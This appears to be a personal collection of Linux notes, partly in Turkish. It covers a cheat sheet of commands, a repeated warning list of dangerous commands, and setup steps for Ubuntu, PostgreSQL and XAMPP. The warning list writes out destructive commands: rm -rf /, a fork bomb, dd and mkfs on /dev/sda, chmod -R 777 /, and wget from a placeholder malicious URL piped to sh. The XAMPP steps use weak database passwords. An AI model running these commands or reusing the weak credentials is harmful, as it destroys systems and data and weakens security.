The fork bomb command creates a function called : and defines the contents of the function, making it execute itself and pipe into another call of itself. Thus, the function runs in the foreground while making the same process run in the background. The function executes and replicates itself repeatedly, quickly taking up all your resources until the system freezes. 

Note: The fork bomb is also called the Rabbit Virus or Wabbit, and it is essentially a DOS attack. You can defend against this type of attack by limiting your session to fewer processes. Run: ulimit -S -u 5000 to limit the process number to 5000. 


4. > file Command

The > file command is short for cat /dev/null > file.

Redirecting a command to a file can be very useful, but making a mistake in the command syntax or running the command carelessly can wipe out a critical system file.

The > file command uses the bash redirection feature to flush a file's contents, wiping it clean.

For example, run:

$ > examplefile.conf

The output creates an empty configuration file. Additionally, prepending a whitespace before the command prevents it from appearing in the log in Bash shell. This means that someone can flush your files, and there will be no trace left if they precede the command with a whitespace.


5. mv directory /dev/null

Another dangerous command you can find online is to move a directory or file to /dev/null. In Linux, /dev/null is a file known as "the black hole" because it destroys any data that you move to the file's location. However, since /dev/null is not a directory, but a character file, mv cannot overwrite it with another directory. On the other hand, you can move a file there, and the file overwrites the content of /dev/null.

For example:

$ sudo mv /home/busra/employees.txt /dev/null

After running this command, /dev/null is a regular file. The danger in making that change is that /dev/null is never supposed to output any data, and now it is a regular file. With that configuration being wrong, it can lead to random data being inserted into system files, leading to a broken system.


6. wget http://malicious_source_url -O-|sh

The wget command allows you to download files in the terminal. However, the command may instruct wget to download a script from a malicious source and execute it with sh. Always pay attention to the address of the package or file you are downloading, and make sure it is a trusted source, or else you risk infecting your system.

7. crontab -r

The crontab command helps automate everyday tasks. However, all the commands and instructions are kept in a single crontab file, which can be removed by specifying the -r flag. This can happen by mistake when you want to specify the -e flag and accidentally enter -r. Beware because there is no yes/no prompt before removing the file. Make sure to back up your crontab file as there aren't many recovery options once deleted.


8. history | sh

The history | sh command can be dangerous because it executes every command from the command log that you have already executed. The action can cause system instability and execute commands that you didn't want to execute again.


9. dd if=/dev/zero of=/dev/sda

The dd command instructs the system to write data to physical drives. The data source is defined in the if parameter, which can be random of if you want to write random data to the block. The if parameter can also be zero of if you want to zero out your hard drive. Either choice removes the OS from the drive.

For example:

$ dd if=/dev/random of=/dev/sda

Running the command above fills your hard drive with random data, causing your system to fail.


10. mkfs.ext3 /dev/sda

The mkfs command creates a new filesystem on the specified device. Running mkfs could be dangerous if you didn't back up your data before running the command. It formats the specified partition/hard drive, completely wiping all data from it.

Warning: While it is useful to format disk partitions, formatting an entire hard drive (such as /dev/sda) leaves the system irrecoverable. 

In the following example, mkfs creates a new ext.3 filesystem after formatting the entire hard drive:

$ mkfs.ext3 /dev/sda

Since the command formats the entire hard drive to make a new filesystem, the system is no longer bootable and outputs the following error:

FATAL: No bootable medium found! System halted.

Depending on your preferences, you can also instruct mkfs to create a different filesystem, such as ext4. You can also choose to format a single partition or a different hard drive, specified in place of /dev/sda:

$ mkfs.ext4 /dev/sda1

In the example above, we instructed mkfs to create an ext4 filesystem on the first partition on the first hard drive.

11. gunzip untrusted.gz

Unzipping an untrusted archive may turn out to be a zip bomb, also known as a decompression bomb. A zip bomb is a malicious file that attacks the system trying to read it. When decompressing the file, it occupies a lot of disk space, which can be fatal for many system services. So, it is best to be careful when handling archives from untrusted sources, mainly because the zip bomb is one of the oldest malicious files on the internet.


12. Remove Python

Before you think about removing an older version of Python from your Linux system, be aware that the system requires a working python2 installation to function correctly. Uninstalling the default Python version on Ubuntu causes the Graphical Display Manager used for logging into the system to fail, and you get locked out of your system. However, if you know what you are doing, you can uninstall Python2.x.x and all its dependencies by running:

$ sudo apt purge python2.x-minimal


13. chmod -R 777 /

Linux is a multi-user system, and the chmod command allows you to change file permissions to configure user access to a certain file or directory. However, chmod can recursively change the permissions of all your files:

$ chmod -R 777 /

The command above allows all users to read, write, and execute all files on the system, which compromises security. Additionally, certain systems may malfunction if the permissions are too open and prevent the system from booting.

-------------------------------------------------------------------------




-------------------------------------------------------------------------


Dosya Adı : linux/linuxcommandslistTurkish.txt

-------------------------------------------------------------------------
										Donanım Bilgileri Komutları

lscpu															→ CPU bilgilerini gösterir.
lsblk															→ Block aygıtları hakkında bilgileri gösterir.
lspci -tv													→ PCI aygıtlarını (grafik kartı, ağ kartı, vb.) ağaç benzeri bir diyagramda gösterir.
lsusb -tv													→ USB aygıtlarını ağaç benzeri bir diyagramda görüntüleyin.
lshw															→ Donanım yapılandırma bilgilerini listeler.
cat /proc/cpuinfo									→ Ayrıntılı CPU bilgilerini gösterir.
cat /proc/meminfo									→ Ayrıntılı sistem belleği bilgilerini gösterir.
cat /proc/mounts									→ Bağlı dosya sistemlerine görüntüler.
free -h														→ Boş ve kullanılan belleği görüntüler.
sudo dmidecode										→ BIOS'tan donanım bilgilerini gösterir.
hdparm -i /dev/[device_name]			→ Disk veri bilgilerini görüntüler.
hdparm -tT /dev/[device_name]			→ Aygıt/disk üzerinde bir okuma hızı testi gerçekleştirir.
badblocks -s /dev/[device_name]		→	Aygıt/disk üzerindeki okunamayan blokları test eder.
fsck /dev/[device_name]						→ Disk taraması başlar ve bulunan hatalar çıktı olarak verilir. Düzeltmesi kullanıcıya sorulur. Kullancı [y] tuşuna basıp, hatayı düzeltebilir.

-------------------------------------------------------------------------
													Arama Komutları

find [path] -name [search_pattern]							→ Belirtilen bir konumda belirtilen search_pattern eşleşen dosya ve dizinleri bulur.
find [path] -size [+100M]												→ Bir dizinde belirtilen boyuttan daha büyük dosya ve dizinleri gösterir.
grep [search_pattern] [file_name]								→  grep ile bir dosyada belirli bir kalıbı arama yapar.
grep -r [search_pattern] [directory_name]				→ -r parametresi ile belirtilen bir dizinde bulunan tüm metin dosyalarında arama yapar.
locate [name]																		→ Belirli bir isimle ilgili tüm dosya ve dizinleri bulur.
which [command]																	→ PATH ortam değişkenindeki komut yolunu arar.
whereis [command]																→ PATH ortam değişkenindeki komut yolunu arar. (Daha kapsamlı bir arama yapar.)
awk '[search_pattern] {print $0}' [file_name]		→ Bir dosyadaki bir kalıpla eşleşen tüm satırları yazdırır. 
sed 's/[old_text]/[new_text]/' [file_name]			→ Belirtilen bir dosyadaki metni bul ve değiştir.


-------------------------------------------------------------------------
													Dosya Komutları

mkdir [directory_name]																→ Yeni bir dizin(klasör) oluşturur.
rm [file_name]																				→ Dosyayı kaldırır.
rm -r [directory_name]																→ Dizini özyinelemeli olarak kaldırır. (iç içe olan dizinler için)
rm -rf [directory_name]																→ Onay gerektirmeden bir dizini özyinelemeli olarak kaldırır. (Zorla kaldırır)
cp [source_file] [destination_file]										→ cp komutunu kullanarak bir dosyanın içeriğini başka bir dosyaya kopyalar.
cp -r [source_directory] [destination_directory]			→ Dizini ikinci bir dizine özyinelemeli olarak kopyalar.(iç içe olan dizinler için)
mv [source_file] [destination_file]										→ Dosyaları/dizinleri taşıyın veya yeniden adlandırın.
ln -s [path]/[file_name] [link_name]									→ Bir dosyaya sembolik bir bağlantı oluşturur.
touch [file_name]																			→ Touch kullanarak yeni bir dosya oluşturur.
cat [file_name]																				→ Dosyanın içeriğini gösterir.
cat [source_file] >> [destination_file]								→ Dosya içeriğini başka bir dosyaya ekler.
head [file_name]																			→ Dosyanın ilk on satırını gösterir.(Default değeri 10; istediğin satır değerini için: -n )
tail [file_name]																			→ Dosyanın son on satırını gösterir.(Default değeri 10; istediğin satır değerini için: -n )
more [file_name]																			→ Dosyanın içeriğini sayfa sayfa gösterir.
less [file_name]																			→ Dosyanın tamamını ekrana yazdırmak yerine belli bir kısmını ekrana basar. Satırlar arasında gezinmek için için yön tuşları kullanılır.
nano [file_name]																			→ Open or create a file using the nano text editor.
vi [file_name]																				→ Open or create a file using the Vi/Vim text editor.
vim [file_name]																				→ Open or create a file using the Vi/Vim text editor.
gpg -c [file_name]																		→ Dosyayı şifreler.
gpg [file_name].gpg																		→ Şifrelenmiş bir .gpg dosyasının şifresini çözer.
wc -w [file_name]																			→ Dosyadaki kelime, satır ve bayt sayısını gösterir.
ls | xargs wc																					→ Dizindeki her dosyadaki satır/kelime/karakter sayısını listeler.
cut -d [delimiter] [file_name]												→ Dosyanın bir bölümünü keser ve sonucu standart çıktıya yazdırır.
[data] | cut -d [delimiter]														→ Piped verinin bir bölümünü keser ve sonucu standart çıktıya yazdırır.
shred -u [file_name]																	→ Silme işlemini bizzat disk üzerindeki adreslere giderek yapar.
diff [first_file] [second_file]												→ İki dosyayı karşılaştırır ve farkları görüntüler.
source [file_name]																		→ Dosyanın içeriğini (genellikle komutlar kümesinden oluşan bir dosya) okumak ve komutarı yürütmek için kullanılır.
[command] | tee [file_name] >/dev/null								→ Standart girdiyi verilen dosyalara ve ayrıca standart çıktıya kopyalar yani komutların çıktılarını hem görüntüleyip hem de log dosyalarına yazdırabiliriz.


-------------------------------------------------------------------------
									Directory Navigation Commands

ls												→ O an bulunan dizindeki dosya ve dizinleri listeler.
ls -a											→ O an bulunan dizindeki dosya ve dizinleri listeler. (gizli dosyalar dahil).
ls -l											→ Dosyaları ve dizinleri uzun biçimde listeler.
pwd												→ Şu anda çalıştığınız dizini gösterir.
cd												→ Dizini $HOME olarak değiştirir.
cd ~											→ Dizini $HOME olarak değiştirir.
cd ..											→ Bir dizin seviyesi yukarı git.
cd -											→ Önceki dizine geç.
cd [directory_path]				→ Konumu belirtilen bir dizine gider.
dirs											→ Geçerli dizin yığınını gösterir.

-------------------------------------------------------------------------
											Dosya Sıkıştırma Komutları

tar -cf [archive.tar] [file/directory]				→ Mevcut dosya veya dizini sıkıştırır.
tar -xf [archive.tar]													→ Sıkıştırılmış dosyayı dışarı ayıklar.
tar -czf [archive.tar.gz]											→ .gz sıkıştırılmış tar arşivi oluştur.
gzip [file_name]															→ .gz dosyalarını sıkıştırır veya ayıklar.
gunzip [file_name.gz]													→ .gz dosyalarını sıkıştırır veya ayıklar.
bzip2 [file_name]															→ .bz2 dosyalarını sıkıştırır veya ayıklar.
bunzip2 [file_name.bz2]												→ .bz2 dosyalarını sıkıştırır veya ayıklar.

-------------------------------------------------------------------------
												Dosya Aktarım Komutları

wget [link]																										→ FTP veya web sunucularından dosya indirir.
curl -O [link]																								→ Çeşitli protokollerle bir sunucuya veya sunucudan veri aktarır.
ftp [remote_host]																							→ Yerel ve uzak sistemler arasında etkileşimli olarak dosya aktarır.
sftp [user]@[remote_host]																			→ Yerel ve uzak ana bilgisayarlar arasında güvenli bir şekilde aktarım yapar.
scp [source_file] [user]@[remote_host]:[destination_path]			→ Dosyayı güvenli bir şekilde sunucu dizinine kopyalar
rsync -a [source_directory] [user]@[remote_host]:[destination_directory]	→ Dizinin içeriğini bir yedek dizinle senkronize edin.

-------------------------------------------------------------------------
												User and Group Commands

id																									→ See details about the active users.
last																								→ Show the last system logins.
who																									→ Display who is currently logged into the system with the who command.
w																										→ Show which users are logged in and their activity with the w command.
finger [user_name]																	→ Show user information.
sudo useradd [user_name]														→ Create a new user account.
sudo adduser [user_name]														→ Create a new user account through the adduser command interface.
sudo userdel [user_name]														→ Delete a user account.
sudo usermod -aG [group_name] [user_name]						→ Modify user information (add a user to a group).
passwd																							→ Change the current user's password or another user's password with the passwd command.
sudo passwd [user_name]															→ Change the current user's password or another user's password with the passwd command.
sudo groupadd [group_name]													→ Add a new group.
sudo groupdel [group_name]													→ Delete a group.
sudo groupmod -n [new_name] [old_name]							→ Modify a user group (change group name).
sudo [command]																			→ Temporarily elevate user privileges to superuser or root using the sudo command.
su - [user_name]																		→ Switch the user account or become a superuser.
chgrp [group_name] [file/directory]									→ Change file or directory group.

-------------------------------------------------------------------------
											Package Installation Commands
											
1. Debian and Ubuntu-Based Distributions

sudo apt-get install [package_name]			→ Install an APT package using the apt-get package utility.
sudo apt install [package_name]					→ Install an APT package using a newer APT package manager.
apt search [keyword]										→ Search for a package in the APT repositories.
apt list																→ List packages installed with APT.
apt show [package_name]									→ Show information about a package.
sudo dpkg -i [package_name.deb]					→ Install a .deb package with the Debian package manager (dpkg command).
sudo dpkg -l														→ List packages installed with dpkg.

2. Red Hat-Based Distributions (CentOS, Fedora)

sudo yum install [package_name]					→ Install a package using the YUM package manager.
yum search [keyword]										→ Find a package in the YUM repositories based on the provided keyword.
yum list installed											→ List all packages installed with YUM.
yum info [package_name]									→ Show package information for a package.
sudo dnf install [package_name]					→ Install a package using the DNF package manager.
sudo rpm -i [package_name.rpm]					→ Install a .rpm package from a local file.

3. Universal Linux Packages

sudo snap install [package_name]			→ Install a Snap package.
sudo snap find [keyword]							→ Search for a package in the Snap store.
sudo snap list												→ List installed Snap packages.
flatpak install [package_name]				→ Install a Flatpak package.
flatpak search [keyword]							→ Search for a Flatpak application in repositories.
flatpak list													→ List installed Flatpack packages.

tar -zxvf [file_name.tar.gz]
cd [extracted_directory]							Install software from source code.
./configure make
make install	

-------------------------------------------------------------------------
											Process Related Commands

ps																→ List active processes.
pstree														→ Show processes in a tree-like diagram.
pmap															→ Display a memory usage map of processes.
top																→ See all running processes.
htop															→ Interactive and colorful process viewer.
kill [process_id]									→ Terminate a Linux process under a given ID.
pkill [process_name]							→ Terminate a process under a specific name.
killall [label]										→ Terminate all processes with a given label.
prgrep [keyword]									→ List processes based on the provided keyword.
pidof [process_name]							→ Show the PID of a process.
bg																→ List and resume stopped jobs in the background.
fg																→ Bring the most recently suspended job to the foreground.
fg [job]													→ Bring a particular job to the foreground.
lsof															→ List files opened by running processes with lsof command.
trap "[commands]" [signal]				→ Catch a system error signal in a shell script. Executes provided commands when the signal is caught.
wait															→ Pause the terminal or a Bash script until a running process is completed.
nohup [command] &									→ Run a Linux process in the background.

-------------------------------------------------------------------------
								System Management and Information Commands

uname -r 													→ Show system information via uname command.
uname -a 													→ See kernel release information.
uptime 														→ Display system uptime, including the load average.
hostname													→ View system hostname.
hostname -i 											→ Show the IP address of the system.
last reboot 											→ List system reboot history.
date															→ See current time and date.
timedatectl 											→ Query and change the system clock.
cal																→ Show current calendar (month and day).
w																	→ List logged-in users.
whoami														→ See which user you are using.
finger [user_name]								→ Show information about a particular user.
ulimit [flags] [limit]						→ View or limit system resource amounts.
shutdown [hh:mm]									→ Schedule a system shutdown.
shutdown now											→ Shut down the system immediately.
modprobe [module_name]						→ Add a new kernel module.
dmesg															→ Show bootup messages.

-------------------------------------------------------------------------
														Disk Usage Commands

df -h																			→ Check free and used space on mounted systems.
df -i																			→ Show free inodes on mounted file systems.
fdisk -l																	→ Display disk partitions, sizes, and types with the command.
du -ah																		→ See disk usage for all files and directories.
du -sh																		→ Show disk usage of the current directory.
mount																			→ Show currently mounted file systems.
findmnt																		→ Display target mount point for all file systems.
mount [device_path] [mount_point]					→ Mount a device.

-------------------------------------------------------------------------
												SSH Login Commands

ssh [user_name]@[remote_host]																	→ Connect to a remote host as a user via SSH.
ssh [host]																										→ Securely connect to a host via SSH default port 22.
ssh -p [port] [user_name]@[remote_host]												→ Connect to the host using a particular port.
ssh-keygen																										→ Generate SSH key pairs.
sudo service sshd start																				→ Start SSH server daemon.
scp [file_name] [user_name]@[remote_host]:[remote_path]				→ Securely copy files between local and remote systems via SSH.
sftp [user_name]@[remote_host]																→ Interactive file transfer over encrypted SSH session using SFTP protocol.
telnet [host]																									→ Connect to the host via Telnet default port 23.

-------------------------------------------------------------------------
										File Permission Commands

chmod 777 [file_name]						→ Assign read, write, and execute file permission to everyone (rwxrwxrwx).
chmod 755 [file_name]						→ Give read, write, and execute permission to owner, and read and execute permission to group and others (rwxr-xr-x).
chmod 766 [file_name]						→ Assign full permission to the owner, and read and write permission to the group and others (rwxrw-rw-).
chown [user_name] [file_name]		→ Change the ownership of a file with chown command.
chown [user_name]:[group_name] [file_name]			→ Change the owner and group ownership of a file.

-------------------------------------------------------------------------
												Network Commands

ip addr show														→ List IP addresses and network interfaces.
ip address add [IP_address]							→ Assign an IP address to interface eth0.
ifconfig																→ Display IP addresses of all network interfaces.
ping [remote_host]											→ Ping remote host.
netstat -pnltu													→ See active (listening) ports with the netstat command.
netstat -tuln														→ Show TCP and UDP ports and their programs.
whois [domain_name]											→ Display more information about a domain.
dig [domain_name]												→ Show DNS information about a domain using the dig command.
dig -x [domain_name]										→ Do a reverse DNS lookup on the domain.
dig -x [IP_address]											→ Do a reverse DNS lookup of an IP address.
host [domain_name]											→ Perform an IP lookup for a domain.
hostname -I															→ Show the local IP address.
nslookup [domain_name]									→ Receive information about an internet domain.

-------------------------------------------------------------------------
											Variable Commands

let "[variable_name]=[value]"						→ Assign an integer value to a variable.
export [variable_name]									→ Export a Bash variable.
declare [variable-name]= "[value]"			→ Declare a Bash variable.
set																			→ List the names of all the shell variables and functions.
unset [variable_name]										→ Remove an environment variable.
echo $[variable-name]										→ Display the value of a variable.

-------------------------------------------------------------------------
											Shell Command Management

alias [alias-name]='[command]'									→ Create an alias for a command.
watch -n [interval-in-seconds] [command]				→ Set a custom interval to run a user-defined command.
sleep [time-interval] && [command]							→ Postpone the execution of a command.
at [hh:mm]																			→ Create a job to be executed at a certain time (Ctrl+D to exit prompt after you type in the command).
man [command]																		→ Display a built-in manual for a command.
history																					→ Print the command history used in the terminal.

-------------------------------------------------------------------------
									Linux Shell Keyboard Shortcuts

Ctrl + C			→ Kill process running in the terminal.
Ctrl + Z			→ Stop the current process. The process can be resumed in the foreground with fg or in the background with bg.
Ctrl + W			→ Cut one word before the cursor and add it to the clipboard.
Ctrl + U			→ Cut part of the line before the cursor and add it to the clipboard.
Ctrl + K			→ Cut part of the line after the cursor and add it to the clipboard.
Ctrl + Y			→ Paste from clipboard.
Ctrl + R			→ Recall the last command that matches the provided characters.
Ctrl + O			→ Run the previously recalled command.
Ctrl + G			→ Exit command history without running a command.
clear					→ Clear the terminal screen.
!!						→ Run the last command again.
exit					→ Log out of the current session.

-------------------------------------------------------------------------
									Dangerous Linux Terminal Commands
									
1. rm -rf /   Command

$ rm -rf /

The rm command in Linux allows you to delete files and directories. However, there is no undelete option, which makes the deleted files gone forever. That means that using the rm command to permanently remove sensitive system files would cause system instability. Running the rm command with the -r and -f flags forces a recursive deletion through all subdirectories. Running it on the / root directory would wipe the system entirely.

Note: Some Linux systems issue a warning before executing this command, like in the screenshot, while others won't.


2. Command  >/dev/sda

$ command >/dev/sda

Executing a command and appending it with >/dev/sda writes the command's output on the /dev/sda block, i.e., on your hard drive. The dev/sda block contains filesystem data, which is then replaced with the command output, damaging your system and making it irrecoverable. The command can be any Linux command. For example, executing the shred command destroys all the data on the drive.


3. :(){ :|:& };: Fork Bomb

$ :(){ :|:& };:

The fork bomb command creates a function called : and defines the contents of the function, making it execute itself and pipe into another call of itself. Thus, the function runs in the foreground while making the same process run in the background. The function executes and replicates itself repeatedly, quickly taking up all your resources until the system freezes. 

Note: The fork bomb is also called the Rabbit Virus or Wabbit, and it is essentially a DOS attack. You can defend against this type of attack by limiting your session to fewer processes. Run: ulimit -S -u 5000 to limit the process number to 5000. 


4. > file Command

The > file command is short for cat /dev/null > file.

Redirecting a command to a file can be very useful, but making a mistake in the command syntax or running the command carelessly can wipe out a critical system file.

The > file command uses the bash redirection feature to flush a file's contents, wiping it clean.

For example, run:

$ > examplefile.conf

The output creates an empty configuration file. Additionally, prepending a whitespace before the command prevents it from appearing in the log in Bash shell. This means that someone can flush your files, and there will be no trace left if they precede the command with a whitespace.


5. mv directory /dev/null

Another dangerous command you can find online is to move a directory or file to /dev/null. In Linux, /dev/null is a file known as "the black hole" because it destroys any data that you move to the file's location. However, since /dev/null is not a directory, but a character file, mv cannot overwrite it with another directory. On the other hand, you can move a file there, and the file overwrites the content of /dev/null.

For example:

$ sudo mv /home/busra/employees.txt /dev/null

After running this command, /dev/null is a regular file. The danger in making that change is that /dev/null is never supposed to output any data, and now it is a regular file. With that configuration being wrong, it can lead to random data being inserted into system files, leading to a broken system.


6. wget http://malicious_source_url -O-|sh

The wget command allows you to download files in the terminal. However, the command may instruct wget to download a script from a malicious source and execute it with sh. Always pay attention to the address of the package or file you are downloading, and make sure it is a trusted source, or else you risk infecting your system.

7. crontab -r

The crontab command helps automate everyday tasks. However, all the commands and instructions are kept in a single crontab file, which can be removed by specifying the -r flag. This can happen by mistake when you want to specify the -e flag and accidentally enter -r. Beware because there is no yes/no prompt before removing the file. Make sure to back up your crontab file as there aren't many recovery options once deleted.


8. history | sh

The history | sh command can be dangerous because it executes every command from the command log that you have already executed. The action can cause system instability and execute commands that you didn't want to execute again.


9. dd if=/dev/zero of=/dev/sda

The dd command instructs the system to write data to physical drives. The data source is defined in the if parameter, which can be random of if you want to write random data to the block. The if parameter can also be zero of if you want to zero out your hard drive. Either choice removes the OS from the drive.

For example:

$ dd if=/dev/random of=/dev/sda

Running the command above fills your hard drive with random data, causing your system to fail.


10. mkfs.ext3 /dev/sda

The mkfs command creates a new filesystem on the specified device. Running mkfs could be dangerous if you didn't back up your data before running the command. It formats the specified partition/hard drive, completely wiping all data from it.

Warning: While it is useful to format disk partitions, formatting an entire hard drive (such as /dev/sda) leaves the system irrecoverable. 

In the following example, mkfs creates a new ext.3 filesystem after formatting the entire hard drive:

$ mkfs.ext3 /dev/sda

Since the command formats the entire hard drive to make a new filesystem, the system is no longer bootable and outputs the following error:

FATAL: No bootable medium found! System halted.

Depending on your preferences, you can also instruct mkfs to create a different filesystem, such as ext4. You can also choose to format a single partition or a different hard drive, specified in place of /dev/sda:

$ mkfs.ext4 /dev/sda1

In the example above, we instructed mkfs to create an ext4 filesystem on the first partition on the first hard drive.

11. gunzip untrusted.gz

Unzipping an untrusted archive may turn out to be a zip bomb, also known as a decompression bomb. A zip bomb is a malicious file that attacks the system trying to read it. When decompressing the file, it occupies a lot of disk space, which can be fatal for many system services. So, it is best to be careful when handling archives from untrusted sources, mainly because the zip bomb is one of the oldest malicious files on the internet.


12. Remove Python

Before you think about removing an older version of Python from your Linux system, be aware that the system requires a working python2 installation to function correctly. Uninstalling the default Python version on Ubuntu causes the Graphical Display Manager used for logging into the system to fail, and you get locked out of your system. However, if you know what you are doing, you can uninstall Python2.x.x and all its dependencies by running:

$ sudo apt purge python2.x-minimal


13. chmod -R 777 /

Linux is a multi-user system, and the chmod command allows you to change file permissions to configure user access to a certain file or directory. However, chmod can recursively change the permissions of all your files:

$ chmod -R 777 /

The command above allows all users to read, write, and execute all files on the system, which compromises security. Additionally, certain systems may malfunction if the permissions are too open and prevent the system from booting.

-------------------------------------------------------------------------




-------------------------------------------------------------------------


Dosya Yolu: other/errors.txt

→ apache2.service failed 

× apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; enabled; vendor preset: enabled)
     Active: failed (Result: exit-code) since Tue 2024-02-27 15:58:12 +03; 30min ago
       Docs: https://httpd.apache.org/docs/2.4/
        CPU: 62ms
        
sudo netstat -ltnp | grep ':80'

Output: tcp6 0 0 :::80 :::* LISTEN 1500/apache2

sudo kill 1500
sudo service apache2 restart

→ 
Dosya Yolu: other/ubuntuKurulumSonrasIslemler.txt


→ Bios önyükleme temizliği
	root@bellis:/home/busra/Masaüstü/notlar/xampp# efibootmgr
	BootCurrent: 0003
	Timeout: 0 seconds
	BootOrder: 0003,0018,0002,0001,0000,0014,0015,0016,0017,0019,001A
	Boot0000* Windows Boot Manager
	Boot0001* ubuntu
	Boot0002* ubuntu
	Boot0003* ubuntu
	Boot0010  Setup
	Boot0011  Boot Menu
	Boot0012  Diagnostic Splash
	Boot0013  OilDiagApp
	Boot0014* USB FDD:
	Boot0015* NVMe:
	Boot0016* ATA HDD: KIOXIA-EXCERIA SATA SSD                 
	Boot0017* ATAPI CD:
	Boot0018* USB HDD:
	Boot0019* USB CD:
	Boot001A* PCI LAN: Realtek PXE B03 D00
	root@bellis:/home/busra/Masaüstü/notlar/xampp# sudo efibootmgr -b 0003 -B
	BootCurrent: 0003
	Timeout: 0 seconds
	BootOrder: 0018,0002,0001,0000,0014,0015,0016,0017,0019,001A
	Boot0000* Windows Boot Manager
	Boot0001* ubuntu
	Boot0002* ubuntu
	Boot0010  Setup
	Boot0011  Boot Menu
	Boot0012  Diagnostic Splash
	Boot0013  OilDiagApp
	Boot0014* USB FDD:
	Boot0015* NVMe:
	Boot0016* ATA HDD: KIOXIA-EXCERIA SATA SSD                 
	Boot0017* ATAPI CD:
	Boot0018* USB HDD:
	Boot0019* USB CD:
	Boot001A* PCI LAN: Realtek PXE B03 D00


→ Enable Minimize on Dock Click (Açılan pencereyi icon'a tıklayınca küçülmesi)
	gsettings set org.gnome.shell.extensions.dash-to-dock click-action 'minimize'

→ Install pulseaudio volume control
	sudo apt update
	sudo apt install pavucontrol
	
→ Install ubuntu-cleaner
	sudo add-apt-repository ppa:gerardpuig/ppa
	sudo apt update
	sudo apt install ubuntu-cleaner

→ sudo apt install gzip     => (sıkıştırma)

→ sudo apt install leafpad  => (notepad)

→ sudo apt install vim      => (editor)

→ sudo apt install net-tools

→ sudo apt install -f       =>(Kurduğumuz dosyada eksikler varsa onlar bulup yükler)

→ sudo apt install curl -y  --> Böyle bir site var mı kontrol eder

→ sudo apt-get install unrar -y 

→ sudo apt-get install rar

→ sudo apt-get install openssh-server -y

→ sudo apt-get install nginx -y

→ sudo snap install heroku --classic


→ 

→ 

→ 

→ 

→ 

→ 

→ 

→ 


→ 

→ 

→ 

→ 

→ 

→ 

→ 

→ 

→ 

→ 

→ 























	
Dosya Yolu: postgresql/postgresql-kurulum.txt


→ PostgreSQL Kurulumu

# Create the file repository configuration:
sudo sh -c 'echo "deb https://apt.postgresql.org/pub/repos/apt $(lsb_release -cs)-pgdg main" > /etc/apt/sources.list.d/pgdg.list'

# Import the repository signing key:
wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add -

# Update the package lists:
sudo apt-get update

# Install the latest version of PostgreSQL.
# If you want a specific version, use 'postgresql-12' or similar instead of 'postgresql':
sudo apt-get -y install postgresql


For more information about the apt repository, including answers to frequent questions, please see the PostgreSQL Apt Repository page on the wiki. (https://wiki.postgresql.org/wiki/Apt)

Included in distribution
Ubuntu includes PostgreSQL by default. To install PostgreSQL on Ubuntu, use the apt-get (or other apt-driving) command:

apt-get install postgresql-12
The repository contains many different packages including third party addons. The most common and important packages are (substitute the version number as required):

postgresql-client-12	client libraries and client binaries
postgresql-12	core database server
libpq-dev	libraries and headers for C language frontend development
postgresql-server-dev-12	libraries and headers for C language backend development

→ pgadmin Kurulumu

#
# Setup the repository
#

# Install the public key for the repository (if not done previously):
curl -fsS https://www.pgadmin.org/static/packages_pgadmin_org.pub | sudo gpg --dearmor -o /usr/share/keyrings/packages-pgadmin-org.gpg

# Create the repository configuration file:
sudo sh -c 'echo "deb [signed-by=/usr/share/keyrings/packages-pgadmin-org.gpg] https://ftp.postgresql.org/pub/pgadmin/pgadmin4/apt/$(lsb_release -cs) pgadmin4 main" > /etc/apt/sources.list.d/pgadmin4.list && apt update'

#
# Install pgAdmin
#

# Install for both desktop and web modes:
sudo apt install pgadmin4

# Install for desktop mode only:
sudo apt install pgadmin4-desktop

# Install for web mode only: 
sudo apt install pgadmin4-web 

# Configure the webserver, if you installed pgadmin4-web:
sudo /usr/pgadmin4/bin/setup-web.sh
Dosya Yolu: xampp/xampp-kurulum.txt				
				
				
				XAMPP

https://www.apachefriends.org/tr/index.html

terminalde indirilenler klasörüne git ve aşağıdaki komutları çalıştır.

sudo su
chmod +x xampp-linux-x64-8.2.12-0-installer.run
./xampp-linux-x64-8.2.12-0-installer.run


→ Bazı eklemeler yapılmalıdır.
1. php.ini
	sudo su
	cd /opt/lampp/etc
	nano php.ini

	Aşağıdaki kodu /opt/lampp/etc/php.ini dosyanın sonuna ekle.

	display_startup_errors     = On
	display_errors             = On
	upload_max_filesize        = 128M
	upload_max_size            = 128M
	post_max_size              = 128M
	max_input_vars             = 5000
	memory_limit               = -1
	error_reporting            = E_ALL & ~E_DEPRECATED & ~E_STRICT & ~E_NOTICE & ~E_WARNING
	mbstring.language          = Turkish
	mbstring.internal_encoding = UTF-8

2. my.ini
	sudo su
	cd /opt/lampp/etc
	nano my.ini
	
	Aşağıdaki kodu /opt/lampp/etc/my.ini dosyanın sonuna ekle.
	
	sql_mode=''
	
→ MySQL içerisine girebilmek için: mysql

→ MySQL içerisinden çıkabilmek için: exit;

→ MySQL Root kullanıcısı için şifre değiştirme

	Aşağıdaki komutlar sırası ile yazılarak MySQL Root kullanıcısının şifresinin değiştirilmesi sağlanır
		mysql -u root -p
		SET PASSWORD FOR 'root'@'localhost' = PASSWORD("root"); veya ALTER USER 'root'@'localhost' IDENTIFIED BY 'PASSWORD_HERE';
		FLUSH PRIVILEGES;
		exit;

	# MySQL Yeni kullanıcı ekleme
		CREATE USER 'dbadmin'@'localhost' IDENTIFIED BY 'dbadmin';
		GRANT ALL PRIVILEGES ON *.* TO 'dbadmin'@'localhost' WITH GRANT OPTION;
		FLUSH PRIVILEGES;
	
	
	
	
	
	
	
	
	
